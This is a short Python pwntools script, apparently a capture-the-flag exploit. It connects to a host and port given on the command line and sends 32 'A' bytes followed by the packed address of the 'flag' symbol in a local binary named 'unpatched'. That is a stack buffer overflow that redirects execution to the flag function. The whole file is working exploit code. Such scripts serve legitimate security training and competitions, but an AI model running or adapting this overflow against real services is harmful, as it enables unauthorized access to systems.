#! /usr/bin/python

from pwn import *
from sys import argv

# specify os and arch
context(os='linux', arch='i386')

elf = ELF('./unpatched')

# connect to TCP socket
# >> your script must have argv1 as the host and argv2 as the port
r = remote(argv[1], int(argv[2]))

# create the payload
prelude = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
getflag = pack(elf.symbols['flag'])

payload = prelude + getflag
r.sendline(payload)

# throw the received output to stdout
log.success(r.recvall())
r.close()
